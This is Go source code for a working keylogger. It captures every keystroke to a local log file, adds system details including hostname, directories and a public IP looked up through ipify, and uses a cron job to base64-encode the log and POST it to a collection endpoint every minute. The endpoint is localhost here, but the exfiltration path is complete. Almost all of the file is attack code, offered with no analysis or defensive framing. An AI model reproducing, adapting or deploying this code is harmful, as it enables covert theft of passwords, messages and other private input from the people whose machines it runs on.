package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/BKasin/go-keylogger"
	"github.com/eiannone/keyboard"
	"github.com/robfig/cron/v3"
)

var (
	userDirectory, _  = os.UserHomeDir()
	userTempDirectory = os.TempDir()
	userArchi         = runtime.GOARCH
	userOs            = string(runtime.GOOS)
	hostname, _       = os.Hostname()
)

type KeyLog struct {
	Body string
}

// var logFileName = string(userTempDirectory + "\\log.txt")
var logFileName = "log.txt"

func main() {
	var wg sync.WaitGroup

	wg.Add(2)
	checkLogFileStatus()
	go getKeyLogStarted(&wg)
	go setCronJob(&wg)
	wg.Wait()
}

// Init Crob Job
func setCronJob(wg *sync.WaitGroup) {
	defer wg.Done()
	// Create a new cron job that runs sendData() every minute
	c := cron.New()
	c.AddFunc("*/1 * * * *", func() {
		sendData()
	})
	c.Start()

	// Wait forever
	select {}
}

// Get LogStarted
func getKeyLogStarted(wg *sync.WaitGroup) {
	defer wg.Done()
	kl := keylogger.NewKeylogger()
	file, err := os.OpenFile(
		logFileName,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0666,
	)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	for {
		key := kl.GetKey()
		if !key.Empty {

			var byting []byte
			if key.Keycode == int(keyboard.KeyEnter) {
				byting = []byte(" ENTER_KEY ")
			} else if key.Keycode == int(keyboard.KeySpace) {
				byting = []byte(" SPACE_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowDown) {
				byting = []byte(" ARROW_DOWN_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowUp) {
				byting = []byte(" ARROW_UP_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowLeft) {
				byting = []byte(" ARROW_LEFT_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowRight) {
				byting = []byte(" ARROW_RIGHT_KEY ")
			} else if key.Keycode == int(keyboard.KeyEsc) {
				byting = []byte(" ESC_KEY ")
			} else if key.Keycode == int(keyboard.KeyBackspace) {
				byting = []byte(" BACKSPACE_KEY ")
			} else if key.Keycode == int(keyboard.KeyDelete) {
				byting = []byte(" DELETE_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlN) {
				byting = []byte(" CTRL_N_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlC) {
				byting = []byte(" CTRL_C_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlZ) {
				byting = []byte(" CTRL_Z_KEY ")
			} else {
				byting = big.NewInt(int64(key.Keycode)).Bytes()
			}

			byteSlice := (byting)
			bytesWritten, err := file.Write(byteSlice)
			if err != nil {
				log.Fatal(err)
			}
			log.Printf("Wrote %d bytes.\n", bytesWritten)
			fmt.Printf("%c %d  \n", key.Rune, key.Keycode)
		}
		time.Sleep(time.Microsecond / 2)
	}
}

// Check If File Exists Or Not
func checkLogFileStatus() {

	fileInfo, err := os.Stat(logFileName)
	if err != nil {
		log.Println(err)
	}
	if os.IsNotExist(err) {
		newFile, err := os.Create(logFileName)
		if err != nil {
			log.Println(err)
		}
		log.Println(newFile.Name())
		writeSysInfo()
	} else {
		log.Println(fileInfo.Name())
	}
}

// Fetch System Information
func writeSysInfo() {
	//Open a new file for writing only
	file, err := os.OpenFile(
		logFileName,
		// os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0666,
	)
	if err != nil {
		log.Println(err)
	}
	defer file.Close()
	res, _ := http.Get("https://api.ipify.org")
	ip, _ := io.ReadAll(res.Body)
	sysInfo := ("Operating System:	" + userOs + "\nHostname:	" + hostname + "\nPublic Ip:	" + string(ip) + "\nArchitecture:	" + userArchi + "\nUser Home Directory:	" + userDirectory + "\nUser Temp Directory:	" + userTempDirectory + "\n------------------------------------\nKEYS\n------------------------------------\n")
	byteSlice := []byte(sysInfo)
	bytesWritten, err := file.Write(byteSlice)
	if err != nil {
		log.Println(err)
	}
	log.Printf("Wrote %d bytes.\n", bytesWritten)
}

// send Data with cron job
func sendData() {
	data, _ := os.ReadFile(logFileName)

	//fmt.Printf("Data as hex: %x\n", data)
	fmt.Println("Number of bytes read:", len(data))
	str := base64.StdEncoding.EncodeToString(data)

	body := KeyLog{string(str)}
	bodyEnc, _ := json.Marshal(body)
	// Define the data to be sent
	//body := []byte(fmt.Sprintf(`{"body":%s}`, string(data)))

	// Create a new request with the data
	req, err := http.NewRequest("POST", "http://localhost:3000/getkeyloggerdata/", bytes.NewBuffer(bodyEnc))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	// Set headers if necessary
	req.Header.Set("Content-Type", "application/json")

	// Make the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending data:", err)
		return
	}
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode != http.StatusOK {
		fmt.Println("Unexpected status code:", resp.StatusCode)
		return
	} else {
		fmt.Println("Data sent successfully!", http.StatusOK)
		return
	}
}
